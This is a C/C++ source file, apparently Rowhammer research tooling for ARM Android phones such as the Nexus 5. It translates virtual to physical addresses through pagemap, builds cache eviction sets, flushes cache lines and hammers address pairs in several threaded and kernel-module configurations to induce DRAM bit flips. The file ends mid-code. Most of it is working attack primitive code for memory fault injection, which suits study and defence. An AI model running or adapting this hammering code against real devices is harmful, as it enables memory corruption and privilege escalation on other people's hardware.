//#include <asm/unistd.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <linux/kernel-page-flags.h>
#include <map>
#include <fstream>
#include <iostream>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mount.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/sysinfo.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>
#include <vector>
#include <sys/time.h>
#include <pthread.h>

#include <asm/unistd.h>
#include <dirent.h>
#include <fcntl.h>
#include <linux/perf_event.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#include <algorithm>

#include "rowharm.h"

#include <linux/msm_ion.h>
//#include <linux/ion.h>

//extern void __clear_cache (char*, char*);


/* Physical pagesize on ARM is 4K (confirmed for the Nexus 5) */
#ifdef ARM7
#define PAGESIZE 4096 
#endif

/* Some constants */
#define K500 524288
#define K4        4096
#define K8        8192
#define K16      16384
#define K32      32768
#define K64      65536
#define K128    131072
#define K256    262144
#define K512    524288
#define M1     1048576
#define M2     2097152
#define M4     4194304 
#define M10   10485760
#define M16   16777216
#define M20   20971520
#define M40   41943040 
#define M100 104857600
#define M200 209715200
#define M256 268435456
#define M400 412144000
#define G1   1073741824
#define G2   2147483648

/* Number of cores to use for hammering */
#define HAMMER_CORES 1

/* The number of memory reads to try during hammering and sidechannel */
#define HAMMER_READCOUNT M2
#define SIDECH_READCOUNT K500

/* The fraction of physical memory that should be mapped for testing */
#define MEM_FRACTION  0.5;

/* The size of the buffer that is used by the 'random read thread' */
#define RANDOM_BUFFER_SIZE M100

#define CACHELINESIZE 64

// Hammer Configurations: HC_*

#define HC_SINGLE 247
/* - single threaded */

#define HC_TRIPLE 248
/* - one hammering thread that reads *f and *s
 * - one thread flushing *f
 * - one thread flushing *s */



/* Sidechannels gives us that for the Krait CPU as used on the Nexus 5, we get: */
#define L1_CACHELINE_SIZE 64
#define L1_WAYS 4
#define L1_SETS 16
#define L1_CACHE_SIZE  16384 /* 16KB */

#define L2_CACHELINE_SIZE 128
#define L2_WAYS 8
#define L2_SETS 2048
#define L2_CACHE_SIZE 2097152 /* 2MB */



/* - HC_DEFAULT Single thread that hammers and flushes two 
 *              addresses */
#define HC_DEFAULT              251
#define HC_DEFAULT_READCOUNT    M2

#define HC_ARM8_DEFAULT           252
#define HC_ARM8_DEFAULT_READCOUNT M2


/* - HC_ARM8_NON_TEMPORAL
 * Single thread that hammers by using non-temporal load instruction. */
#define HC_ARM8_NON_TEMPORAL    253
#define HC_ARM8_NON_TEMPORAL_READCOUNT M2

/* - HC_ARM8_DOUBLE
 * One thread that reads and on thread that flushes. */
#define HC_ARM8_DOUBLE           254
#define HC_ARM8_DOUBLE_READCOUNT        M10

/* - HC_ARM8_TRIPLE
 * One thread that reads and two threads that flush. */
#define HC_ARM8_TRIPLE           255
#define HC_ARM8_TRIPLE_READCOUNT M2

/* - HC_BUSY    
 * Single thread that hammers and flushes two addresses while also busy waiting <x> iterations */
#define HC_BUSY                 250
#define HC_BUSY_READCOUNT       M2


/* - HC_EVICT   
 * Single thread that hammers and flushes two addresses by running a cache-eviction loop */
#define HC_EVICT                 249
#define HC_EVICT_READCOUNT       M2


/* - HC_EVICT_QUAD 
 * Three threads that evict, one thread that hammers */
#define HC_EVICT_QUAD           248
#define HC_EVICT_READCOUNT      M2


/* - HC_DMA
 * Assume no cache */
#define HC_DMA                  247
#define HC_DMA_READCOUNT        M2 


#define EVICT_ADDRESSES 10
#define LL_CACHESIZE M1
#define WAYS 1

#ifdef ION
    #define DEFAULT_CONF  HC_DMA
    #define DEFAULT_COUNT HC_DMA_READCOUNT
#else
    #ifdef ARM8
        #define DEFAULT_CONF  HC_ARM8_DEFAULT
        #define DEFAULT_COUNT HC_ARM8_DEFAULT_READCOUNT
    #else
        #define DEFAULT_CONF  HC_DEFAULT
        #define DEFAULT_COUNT HC_DEFAULT_READCOUNT
    #endif // ARM8
#endif // ION



/* file descriptors */
int pagemap_fd;
int kmsg_fd;
int marker_fd;
int perf_fd;
int rh_fd;
int ion_fd;
std::ifstream meminfo("/proc/meminfo");

/* barrier to synchronized hammer threads */
#ifdef ARM7
pthread_barrier_t barrier;
#endif


std::map<uint64_t, uint64_t>reverse_mapping;


#if defined (USE_LKM) && defined (USE_LIBFLUSH)
"Cannot use both LKM and LIBFLUSH"
#endif



uint64_t median(int n, uint64_t x[]) {
    uint64_t temp;
    int i, j;
    for (i = 0; i < n-1; i++) {
        for (j = i+1; j < n; j++) {
            if (x[j] < x[i]) {
                temp = x[i];
                x[i] = x[j];
                x[j] = temp;
            }
        }
    }

    if (n % 2 == 0) {
        return((x[n/2] + x[n/2 - 1]) / 2);
    } else {
        return x[n/2];
    }
}


uint64_t mean(int m, uint64_t a[]) {
    int i;
    int sum = 0;
    for (i = 0; i < m; i++) {
        sum += a[i];
    }
    return (sum / m);
}

uint64_t min(int m, uint64_t a[]) {
    int i;
    int min = a[0];
    for (i = 0; i < m; i++) {
        if (a[i] < min) min = a[i];
    }
    return min;
}
uint64_t max(int m, uint64_t a[]) {
    int i;
    int max = a[0];
    for (i = 0; i < m; i++) {
        if (a[i] > max) max = a[i];
    }
    return max;
}


#define MILLION 1000000L
#define BILLION 1000000000L
uint64_t get_us() 
{
    struct timeval t;
    gettimeofday(&t, NULL);
    return MILLION * t.tv_sec * t.tv_usec;
}
uint64_t get_ns() 
{
  struct timespec t;
  clock_gettime(CLOCK_MONOTONIC, &t);
  return BILLION * (uint64_t) t.tv_sec + (uint64_t) t.tv_nsec;
}

/*
uint64_t volatile get_my_ns() {
#ifdef ARM7
    uint64_t ret = 0;
    asm volatile(
        "sub sp, sp, #12;"
        "mov r1, sp;"
        "mov r0, #1;"
        "bl __clock_gettime;"
        "ldr r3, [sp, #4];"
        "ldr r2, [sp];"
        "mov r0, #42;"
        "mov %0, r0;"
        "mov r0, r3;"
        "mov r3, #51712;"
        "asr r1, r0, #31;"
        "movt r3, #15258;"
        "smlal r0, r1, r3, r2;"
        "add sp, sp, #12;"
        : "=r"(ret)
        :
        : "r0", "r1", "r2", "r3", "sp", "pc",  "memory"
    );
    printf("ret: %llu\n", ret);
    return ret;
#endif
}
*/

static unsigned int nr_cpus_configured(void) { return sysconf(_SC_NPROCESSORS_CONF); }
static unsigned int nr_cpus_online(void) { return sysconf(_SC_NPROCESSORS_ONLN); }

uint64_t get_mem_size() {
  struct sysinfo info;
  sysinfo(&info);
  return (size_t)info.totalram * (size_t)info.mem_unit;
}


/* convert virtual memory to physical using pagemap */
uint64_t frame_number_from_pagemap(uint64_t value)
{
  return value & ((1ULL << 54) - 1);
}
uint64_t get_phys_addr(uintptr_t virtual_addr)
{
  uint64_t value;
  off_t offset = (virtual_addr / PAGESIZE) * sizeof(value);
  int got = pread(pagemap_fd, &value, sizeof(value), offset);
  assert(got == 8);

  // Check the "page present" flag.
  assert(value & (1ULL << 63));

  uint64_t frame_num = frame_number_from_pagemap(value);
  return (frame_num * PAGESIZE) | (virtual_addr & (PAGESIZE-1));
}


int open_perfi(void) {
           struct perf_event_attr pe;
           long long count;
           int fd;

           memset(&pe, 0, sizeof(struct perf_event_attr));
           pe.size = sizeof(struct perf_event_attr);
           pe.disabled = 1;
           pe.exclude_hv = 1;

           pe.type = PERF_TYPE_HARDWARE;
           pe.config = PERF_COUNT_HW_INSTRUCTIONS;

           pe.exclude_kernel = 0;
           pe.exclude_user = 0;

           // measures calling process on any CPU
           int pid = 0; 
           int cpu = -1; 
           return syscall(__NR_perf_event_open, &pe, pid, cpu, -1, 0);
}


int open_perf(void)
{

           struct perf_event_attr pe;
           long long count;
           int fd;

           memset(&pe, 0, sizeof(struct perf_event_attr));
           pe.size = sizeof(struct perf_event_attr);
           pe.disabled = 1;
           pe.exclude_hv = 1;

/* Krait 400 (looks like Cortex-A15) does not support
    - PERF_COUNT_HW_CACHE_REFERENCES
    - PERF_COUNT_HW_CACHE_MISSES
 */
#ifdef ARM7
           pe.type = PERF_TYPE_HW_CACHE;
           pe.config =  PERF_COUNT_HW_CACHE_L1D |
                       (PERF_COUNT_HW_CACHE_OP_READ << 8) |
                       (PERF_COUNT_HW_CACHE_RESULT_MISS << 16);
#else
           pe.type = PERF_TYPE_HARDWARE;
           pe.config = PERF_COUNT_HW_CACHE_MISSES;
#endif

#ifdef USE_LKM
           pe.exclude_kernel = 0;
           pe.exclude_user = 1;
#else
           pe.exclude_kernel = 1;
           pe.exclude_user = 0;
#endif

           int pid = 0; int cpu = -1; // measures calling process on any CPU
//           int pid = 0; int cpu = 1;  // measures calling process on CPU 0

int ret;

           ret = syscall(__NR_perf_event_open, &pe, pid, cpu, -1, 0);
           return ret;
}


#ifdef ARM7
void cacheflush(uint32_t* begin, uint32_t *end)
{   
    const int syscall = 0xf0002;
    __asm __volatile (
        "mov     r0, %0\n"          
        "mov     r1, %1\n"
        "mov     r7, %2\n"
        "mov     r2, #0x0\n"
        "svc     0x00000000\n"
        :
        :   "r" (begin), "r" (end), "r" (syscall)
        :   "r0", "r1", "r7"
        );
}
int insert_jmp(volatile void *s, volatile void *d, int max_ins) {
    uint32_t src = (uint32_t) s;
    uint32_t dst = (uint32_t) d;
    uint32_t *ins = (uint32_t *)src;
    uint32_t pc = src + 8;
    int32_t off = (int32_t) (((int64_t)dst - (int64_t)pc) / 4);

//  printf("src: 0x%x, pc: 0x%x -> dst: 0x%x (offset: %d = 0x%x >> 24 0x%x)\n", 
//          src,       pc,         dst,       off, off, off >> 24);

    if ( ((off >> 24) & 0xff) != 0x00 &&
         ((off >> 24) & 0xff) != 0xff) {
        /* construct a 'long' jump, if possible */
        if (max_ins < 3) return -1;
        ins[0] = 0xe59f1000;        // ldr r1, [pc, #0] -> r1 = ins[2] 
        ins[1] = 0xe12fff11;        // bx r1
        ins[2] = dst;               // .word <target>

//      printf("written long jmp: %08x %08x %08x\n", ins[0], ins[1], ins[2]);
        return 3;
    } 

    uint32_t jmp = (off & 0x00ffffff) | 0xea000000;
    ins[0] = jmp;
//  printf("written jmp: %08x\n", ins[0]);
    return 1;
}
#endif



void *flush_thread(void *info)
{
    struct hammer_addresses_t *cpu = (struct hammer_addresses_t *) info;

    /* CPU pinning */
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu->cpu, &cpuset);
#ifdef ARM7
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    /* Synchronize with the other threads */
    pthread_barrier_wait(&barrier);
#endif

#ifdef USE_LKM
    cpu->cpu = FLUSH_ONLY;
//  ioctl(rh_fd, RH_IOC_HAMMER, cpu);
#else
    while (cpu->read_count-- > 0) {
#ifdef ARM7
//      cacheflush((uint32_t *)cpu->f, (uint32_t *)cpu->f + 1);
#else 
        asm volatile ("dc civac, %0" :: "r"(cpu->f));
#endif // ARM7
    }
#endif // USE_LKM

    return NULL;
}

#ifdef ARM8
void *arm8_flush_thread(void *info)
{
    struct data_t *flush_data = (struct data_t *) info;

    /* Synchronize with the other threads */


    if (flush_data->type == RF_SINGLE) {

        /* there is another thread that we want to get in sync with */
#ifdef ARM7
        pthread_barrier_wait(&barrier);
#endif

        while (flush_data->count-- > 0) {
            asm volatile ("dc civac, %0" :: "r"(flush_data->f));
        }

    } else if (flush_data->type = RF_DOUBLE) {

        while (flush_data->count-- > 0) {
            asm volatile ("dc civac, %0" :: "r"(flush_data->f));
            asm volatile ("dc civac, %0" :: "r"(flush_data->s));
        }
    }


    return NULL;
}
#endif


void *evict_thread1(void *info)
{
    volatile VOID **evict_set = (volatile VOID **) info;
    
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(1, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);
    for (int c = 0; c < HAMMER_READCOUNT*5; c++) { 
        /* start the performance counter (to keep track of cache misses or
         * whatever we are interested in) */
/*
        int S = 1;
        int D = 1;
        int C = 1;
        int L = 1;

        for (int s = 0; s <= S-D; s+= L) 
            for (int x = 0; x < C; x += 1)
                for (int d = 0; d <= D; d+= 1
                        *evict_set[s+d];
*/
    
        for (int i = 0; i < 8; i++) {
            for (int j = 0; j < 2; j++) {
                *evict_set[i];
            }
        }
//        asm volatile("dsb ish;");
//        asm volatile("isb;");

    }

//    printf("THREADY\n");

    return NULL;
}
void *evict_thread2(void *info)
{
    volatile VOID **evict_set = (volatile VOID **) info;
    
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(2, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);
    for (int c = 0; c < HAMMER_READCOUNT*5; c++) { 
        /* start the performance counter (to keep track of cache misses or
         * whatever we are interested in) */

    
        for (int i = 8; i < 16; i++) {
            for (int j = 0; j < 2; j++) {
                *evict_set[i];
            }
        }
//        asm volatile("dsb ish;");
//        asm volatile("isb;");

    }

//  printf("THREADY\n");

    return NULL;
}
void *evict_thread3(void *info)
{
    volatile VOID **evict_set = (volatile VOID **) info;
    
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(3, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);
    
    for (int c = 0; c < HAMMER_READCOUNT*1.5; c++) { 
        /* start the performance counter (to keep track of cache misses or
         * whatever we are interested in) */

    
        for (int i = 0; i < 16; i++) {
            for (int j = 0; j < 2; j++) {
                *evict_set[i];
            }
        }
//        asm volatile("dsb ish;");
//        asm volatile("isb;");

    }

//  printf("THREADY\n");

    return NULL;
}

void *hammer_thread(void *info)
{
    struct hammer_addresses_t *cpu = (struct hammer_addresses_t *) info;

    /* CPU pinning */
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu->cpu, &cpuset);
#ifdef ARM7
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
#endif
   
//#define HAMMER_EXEC
#ifdef HAMMER_EXEC
#define CACHELINE_JUMPS 16 

    extern const char skirt[];
    volatile VOID *f = cpu->f;
    volatile VOID *s = cpu->s;
    int count = 200000; //cpu->read_count;

    int cur_offset = 0;
    int nxt_offset = 0;
    for (int i = 0; i < CACHELINE_JUMPS; i++) {
        cur_offset =  i   *16;
        nxt_offset = (i+1)*16;
        if (insert_jmp(&f[cur_offset], &s[cur_offset], 1) != 1) { 
            printf("No single branch instruction for %p (f) to %p (s)\n", 
                       &f[cur_offset], &s[cur_offset]); 
            exit(EXIT_FAILURE);
        }
        if (insert_jmp(&s[cur_offset], &f[nxt_offset], 1) != 1) {
            printf("No single branch instruction for %p (f) to %p (s)\n", 
                       &s[cur_offset], &f[nxt_offset]); 
            exit(EXIT_FAILURE);
        }
    }
    if (insert_jmp(&s[cur_offset], (void *)skirt, 3) != 3) {
        printf("No long branch instruction for %p (s) to %p (skirt)\n", 
                   &s[cur_offset], (void *)skirt);
        exit(EXIT_FAILURE);
    }

    cacheflush((uint32_t *)f, (uint32_t *)f + 1);
    cacheflush((uint32_t *)s, (uint32_t *)s + 1);

    ioctl(perf_fd, PERF_EVENT_IOC_RESET, 0);

    /* synchronize with the other threads */
#ifdef ARM7
    pthread_barrier_wait(&barrier);
#endif

    /* enable the counter */
    ioctl(perf_fd, PERF_EVENT_IOC_ENABLE, 0);
    
    cpu->cpu = FLUSH_ONLY;
    cpu->t1 = get_ns();
    while (count-- > 0) {
        /* kickstart: jump to f[0] that contains the jump to s[0], that jumps to
         * f[64], ... */
        asm volatile("mov r2, %0;" :: "r"((uint32_t) &f[0]) : "r2");
        asm volatile("bx r2;");

        /* final target of the hammer loop */
        asm volatile("skirt:");
        //cacheflush((uint32_t *)f, (uint32_t *)f + 1);
        //cacheflush((uint32_t *)s, (uint32_t *)s + 1);
        ioctl(rh_fd, RH_IOC_HAMMER, cpu);
    }
#else
    /* enable the counter */
    ioctl(perf_fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(perf_fd, PERF_EVENT_IOC_ENABLE, 0);
    
    
    /* synchronize with the other threads */
#ifdef ARM7
    pthread_barrier_wait(&barrier);
#endif

    cpu->t1 = get_ns();
#ifdef USE_LKM
    cpu->cpu = HAMMER_ONLY;
    ioctl(rh_fd, RH_IOC_HAMMER, cpu);
#else 
    int count = HAMMER_READCOUNT * 10;
    while (count-- >0) {
        *cpu->f;
        *cpu->s;
    }
#endif // USE_LKM
#endif // HAMMER_EXEC
    cpu->t2 = get_ns();
    
    /* stop the counter and - for now - print it (TODO) */
    ioctl(perf_fd, PERF_EVENT_IOC_DISABLE, 0);

    uint64_t counter;
    if (read(perf_fd, &counter, sizeof(counter)) < sizeof(counter)) {
        perror("Could not read performance counter");
        exit(EXIT_FAILURE);
    }
    printf(" (%" PRIu64 ") ", counter);

    return NULL;
}

int test2(void) {
    return 991;
}

/*
uint64_t test(void) {
    srand(time(NULL));
    int x = rand() % 100;
    uint64_t array[10] = {88, 234, 34, 2, 83, 28, 9, 34, 1, 2};
    printf("array[0]: %d\n", array[0]);
    printf("&array: %p\n", &array);
    printf("array[5]: %d\n", array[5]);
//    array[0] = x;
    asm volatile("mov x3, %0; " : : "r"(array));
    asm volatile("dmb nshld;");
    asm volatile("ldnp x1, x2, [x3];");
    asm volatile("mov x0, x2; ");
}
*/

/* hammer two addresses in memory using <cores> cores and <count> times */
uint32_t do_hammer(volatile VOID *f, volatile VOID *s, uint32_t count, int conf, int option = 0) 
{
    if (conf == HC_DEFAULT) {
#ifndef USE_LKM
        fprintf(stderr, "HC_DEFAULT requires -DUSE_LKM\n");
        exit(EXIT_FAILURE);
#endif
        struct data_t user_data;
        user_data.f = f;
        user_data.s = s;
        user_data.count = count;
        user_data.type = RHF_PAIR;
        return ioctl(rh_fd, RH_IOC_HAMMER_FLUSH, &user_data);
    }

#ifdef ARM8
    if (conf == HC_ARM8_DEFAULT) {
        uint32_t co = count;
        uint64_t t1 = get_ns();
        while (co-- > 0) {
            *f;
            *s;
            asm volatile ("dc civac, %0" :: "r"(f));
            asm volatile ("dc civac, %0" :: "r"(s));
        }
        uint64_t t2 = get_ns();
        return ((uint32_t) (t2 - t1)) / (count * 2);
    }
    if (conf == HC_ARM8_DOUBLE) {
        struct data_t flush_data;
        flush_data.f = f;
        flush_data.s = s;
        flush_data.count = count;
        flush_data.type = RF_DOUBLE;

        pthread_t flush_thread;
        
        if (pthread_create(&flush_thread, NULL, arm8_flush_thread, &flush_data)) {
            perror("Could not create flush pthread"); exit(EXIT_FAILURE); }

        uint32_t co = count * 10;
        uint64_t t1 = get_ns();
        while (co-- > 0) {
            *f;
            *s;
        }
        uint64_t t2 = get_ns();
        
        if (pthread_join(flush_thread, NULL)) {
            perror("Could not join pthread"); exit(EXIT_FAILURE); }

        return ((uint32_t) (t2 - t1)) / (count*10 * 2);
    }

    if (conf == HC_ARM8_TRIPLE) {
        struct data_t flush_data1, flush_data2;
        flush_data1.f = f;
        flush_data1.s = NULL;
        flush_data1.count = count;
        flush_data1.type = RF_SINGLE;

        flush_data2.f = s;
        flush_data2.s = NULL;
        flush_data2.count = count;
        flush_data2.type = RF_SINGLE;
        
        pthread_t flush_thread1, flush_thread2;
#ifdef ARM7
        pthread_barrier_init(&barrier, NULL, 2);
#endif
        if(pthread_create(&flush_thread1, NULL, arm8_flush_thread, &flush_data1)) {
            perror("Could not create flush pthread 1"); exit(EXIT_FAILURE); }
        if(pthread_create(&flush_thread2, NULL, arm8_flush_thread, &flush_data2)) {
            perror("Could not create flush pthread 2"); exit(EXIT_FAILURE); }

        /* hammer here */
        uint32_t co = count;
        uint64_t t1 = get_ns();
        while(co-- > 0) {
            *f;
            *s;
        }
        uint64_t t2 = get_ns();

        if (pthread_join(flush_thread1, NULL)) {
            perror("Could not join pthread 1"); exit(EXIT_FAILURE); }
        if (pthread_join(flush_thread2, NULL)) {
            perror("Could not join pthread s"); exit(EXIT_FAILURE); }

        return ((uint32_t) (t2 - t1)) / (count * 2);
    }
    if (conf == HC_ARM8_NON_TEMPORAL) {
        uint64_t t1 = get_ns();
        asm volatile(
        "mov x20, %0;"
        "mov x21, %1;"
        "mov x22, %2;"
        "dmb nshld;"
    "1:"
        "ldnp x1, x2, [x21];"
        "ldnp x1, x2, [x22];"
        "dmb nshld;"
        "sub x20, x20, #0x1;"
        "cmn x20, #0x1;"
        "b.ne 1b;"
            :
            : "r" (count), 
              "r" (f), 
              "r" (s)
            : "x1", "x2", "x20", "x21", "x22", "memory"
        );
        uint64_t t2 = get_ns();
        return ((uint32_t) (t2 - t1)) / (count *2);
    }
#endif  // ARM8

    if (conf == HC_BUSY) {
#ifndef USE_LKM
        fprintf(stderr, "HC_BUSY requires -DUSE_LKM\n");
        exit(EXIT_FAILURE);
#endif
        struct data_t user_data;
        user_data.f = f;
        user_data.s = s;
        user_data.count = count;
        user_data.type = RHF_PAIR_BUSY;
        user_data.option1 = option; // busy loop iterations
        return ioctl(rh_fd, RH_IOC_HAMMER_FLUSH, &user_data);
    }


    if (conf == HC_EVICT) {
#define ACCESSES_PER_LOOP_ROUND  1   // C
#define ADDRESSES_PER_LOOP_ROUND 1   // D
#define STEP_SIZE                1   // L
#define ADDRESSES_IN_SET         11  // S
        /* find addresses that, when read, evict f and s from the cache */
        uint32_t evict_set_f[ADDRESSES_IN_SET];
        uint32_t evict_set_s[ADDRESSES_IN_SET];
        uint32_t vis_f = (uint32_t) get_phys_addr( (uintptr_t) f);
        uint32_t vis_s = (uint32_t) get_phys_addr( (uintptr_t) s);

        uint32_t nxt_vis;
        int idx = 1;
        for (int i = 0; i < ADDRESSES_IN_SET; i++) {
            do {
//              nxt_vis = ((vis_f + L2_CACHELINE_SIZE*L2_SETS*idx));
                nxt_vis = ((vis_f + L2_CACHELINE_SIZE*L2_SETS*idx) + G1) % G2;
                idx++;
            } while (!reverse_mapping.count(nxt_vis));
            evict_set_f[i] = reverse_mapping[nxt_vis];
        }
        idx = 1;
        for (int i = 0; i < ADDRESSES_IN_SET; i++) {
            do {
//              nxt_vis = ((vis_s + L2_CACHELINE_SIZE*L2_SETS*idx));
                nxt_vis = ((vis_s + L2_CACHELINE_SIZE*L2_SETS*idx) + G1) % G2;
                idx++;
            } while (!reverse_mapping.count(nxt_vis));
            evict_set_s[i] = reverse_mapping[nxt_vis];
        }
        volatile VOID **read_set_f = (volatile VOID **) evict_set_f;
        volatile VOID **read_set_s = (volatile VOID **) evict_set_s;
        
        uint32_t co = count;
        uint64_t t1 = get_ns();
        while (co-- > 0) {
            *f;
            *s;
            
            for (int s = 0; s <= ADDRESSES_IN_SET - ADDRESSES_PER_LOOP_ROUND; s += STEP_SIZE) {
                for (int c = 0; c <= ACCESSES_PER_LOOP_ROUND; c += 1) {
                    for (int d = 0; d < ADDRESSES_PER_LOOP_ROUND; d+= 1) {
                        *read_set_f[s+d];
                        *read_set_s[s+d];
                    }
                }
            }
//          asm volatile("dsb ish");
        }
        uint64_t t2 = get_ns();

        return ((uint32_t) (t2 - t1)) / (count * 2);
    }

    if (conf == HC_EVICT_QUAD)
    {
        struct hammer_addresses_t cpu;
        cpu.f = f;
        cpu.s = s;
        cpu.read_count = count;
        
        pthread_t thread1, thread2, thread3;
#ifdef ARM7
        pthread_barrier_init(&barrier, NULL, 4);
#endif

        /* find cache eviction set */
        uint32_t evict_set[18];
   
        uint32_t vis_f = (uint32_t) get_phys_addr( (uintptr_t) f);
        uint32_t vis_s = (uint32_t) get_phys_addr( (uintptr_t) s);
        uint32_t nxt_vis;
        int i;
        int LOOP_COUNT = 50000;


        i = 1;
        for (int j = 0; j < WAYS*2; j+=2) {
            do {
                nxt_vis = (vis_f + (4096 * K256 + i*K256)) % G2;
//              nxt_vis = (vis_f + (i*K256));
                i++;
            } while (!reverse_mapping.count(nxt_vis));
            evict_set[j] = reverse_mapping[nxt_vis];
        }
        
        i = 1;
        for (int j = 1; j < WAYS*2; j+=2) {
            do {
                nxt_vis = (vis_s + (4096 * K256 + i*K256)) % G2;
//              nxt_vis = (vis_s + (i*K256)) % G2;
                i++;
            } while (!reverse_mapping.count(nxt_vis));
            evict_set[j] = reverse_mapping[nxt_vis];
        }
        

#if 0 
        printf("\nQUAD:\n");
        printf("vis(f): %p\n", (void *) vis_f);
        printf("vis(s): %p\n", (void *) vis_s);
        for (int j = 0; j < WAYS*2; j++) {
            printf("vis(evict_set[%d]): %p\n", j, (void *) get_phys_addr(evict_set[j]));
        }

        volatile VOID **set = (volatile VOID **) evict_set;
    
        uint64_t start = get_ns();
        int COUNT = 100000;
        for (int c = 0; c < COUNT; c++) { 
            for (int i = 0; i < WAYS*2; i++) {
                *set[i];
                asm volatile("dsb ish;");
                asm volatile("isb;");
            }
            asm volatile("dsb ish;");
            asm volatile("isb;");
        }
        uint64_t end = get_ns();
        
        uint64_t diff = end - start;
        double ns = (double) diff / (double) ((WAYS*2+0) * COUNT);

        printf("ns_per_read: %6.2f\n", ns);

        exit(0);
#endif

        if(pthread_create(&thread1, NULL, evict_thread1, &evict_set)) {
            perror("Could not create pthread 1"); exit(EXIT_FAILURE); }
        if(pthread_create(&thread2, NULL, evict_thread2, &evict_set)) {
            perror("Could not create pthread 2"); exit(EXIT_FAILURE); }
        if(pthread_create(&thread3, NULL, evict_thread3, &evict_set)) {
            perror("Could not create pthread 3"); exit(EXIT_FAILURE); }

        /* start the performance counter (to keep track of cache misses or
         * whatever we are interested in) */
        ioctl(perf_fd, PERF_EVENT_IOC_RESET, 0);
        ioctl(perf_fd, PERF_EVENT_IOC_ENABLE, 0);
        

        uint64_t t1 = get_ns();
        for (uint32_t i = 0; i < HAMMER_READCOUNT*100; i++) {
            *f;
            *s;
//          asm volatile("dsb ish");
//          asm volatile("isb;");
        }
        uint64_t t2 = get_ns();

//      printf("READY\n");
        
        /* stop the counter and - for now - print it (TODO) */
        ioctl(perf_fd, PERF_EVENT_IOC_DISABLE, 0);
        uint64_t counter = 0;
        if (read(perf_fd, &counter, sizeof(counter)) != sizeof(counter)) {
            perror("Could not read performance counter");
            exit(EXIT_FAILURE);
        }
        printf("(%" PRIu64 ") ", counter);

        uint64_t delta = t2 - t1;
        uint64_t reads = WAYS * LOOP_COUNT;
        double ns_per_read = (double) delta / (double) (2 * count);
       
        if (pthread_join(thread1, NULL)) {
            perror("Could not join pthread 1"); exit(EXIT_FAILURE); }
        if (pthread_join(thread2, NULL)) {
            perror("Could not join pthread 2"); exit(EXIT_FAILURE); }
        if (pthread_join(thread3, NULL)) {
            perror("Could not join pthread 3"); exit(EXIT_FAILURE); }

        return ns_per_read;


        exit(0);

        exit(0);

        pthread_t thread4;

        if(pthread_create(&thread1, NULL, evict_thread1, &evict_set)) {
            perror("Could not create pthread 1"); exit(EXIT_FAILURE); }
        if(pthread_create(&thread2, NULL, evict_thread2, &evict_set)) {
            perror("Could not create pthread 2"); exit(EXIT_FAILURE); }
        if(pthread_create(&thread3, NULL, evict_thread3, &evict_set)) {
            perror("Could not create pthread 3"); exit(EXIT_FAILURE); }
//      if(pthread_create(&thread4, NULL, hammer_thread, &cpu)) {
        if(pthread_create(&thread4, NULL, evict_thread1, &evict_set)) {
            perror("Could not create pthread 4"); exit(EXIT_FAILURE); }

        if (pthread_join(thread1, NULL)) {
            perror("Could not join pthread 1"); exit(EXIT_FAILURE); }
        if (pthread_join(thread2, NULL)) {
            perror("Could not join pthread 2"); exit(EXIT_FAILURE); }
        if (pthread_join(thread3, NULL)) {
            perror("Could not join pthread 3"); exit(EXIT_FAILURE); }
        if (pthread_join(thread4, NULL)) {
            perror("Could not join pthread 4"); exit(EXIT_FAILURE); }

#if 0
        printf("\n");
        printf("%llu\n", cpu.t2);
        printf("%llu\n", cpu.t1);
#endif
        return (cpu.t2 - cpu.t1) / count;
    }

    if (conf == HC_DMA) {
        uint32_t co = count;
        uint64_t t1 = get_ns();
        while (co-- > 0) {
            *f;
            *s;
        }
        uint64_t t2 = get_ns();
        return ((uint32_t) (t2 - t1)) / (count * 2);
    }

    if (conf == HC_TRIPLE) {
        /* cpu1 flushes f
         * cpu2 flushes s
         * cpu3 hammers      */
        struct hammer_addresses_t cpu1, cpu2, cpu3;
        cpu1.f = f; cpu1.s = f;
        cpu2.f = s; cpu2.s = s;
        cpu3.f = f; cpu3.s = s;
        cpu1.read_count = cpu2.read_count = cpu3.read_count = count*2;
        
        /* Used by the threads in case we do CPU pinning. On the Nexus 5x, CPUs
         * 0 - 3 are LITTLE, and CPUs 4 and 5 are big. We use the faster ones
         * for flushing since this seems to be the slowest operation (reads from
         * the cache are extremely fast in any case and reads from memory depend
         * more on the bus and DRAM speed than the speed of the CPU).
         */
        cpu1.cpu = 1; cpu2.cpu = 2; cpu3.cpu = 3; 
#ifdef ARM7
        pthread_barrier_init(&barrier, NULL, 1);
#endif
        pthread_t flush_thread_1, 
                  flush_thread_2, 
                  hammer_thread_3;

//        if(pthread_create(&flush_thread_1, NULL, flush_thread, &cpu1)) {
  //          perror("Could not create flush pthread 1"); exit(EXIT_FAILURE); }
    //    if(pthread_create(&flush_thread_2, NULL, flush_thread, &cpu2)) {
      //      perror("Could not create flush pthread 2"); exit(EXIT_FAILURE); }
        if(pthread_create(&hammer_thread_3, NULL, hammer_thread, &cpu3)) {
            perror("Could not create flush pthread 2"); exit(EXIT_FAILURE); }

//        if (pthread_join(flush_thread_1, NULL)) {
  //          perror("Could not join pthread 1"); exit(EXIT_FAILURE); }
    //    if (pthread_join(flush_thread_2, NULL)) {
      //      perror("Could not join pthread s"); exit(EXIT_FAILURE); }
        if (pthread_join(hammer_thread_3, NULL)) {
            perror("Could not join pthread s"); exit(EXIT_FAILURE); }

        return (cpu3.t2 - cpu3.t1) / count;
    }


    size_t t1, t2;

#if 0 
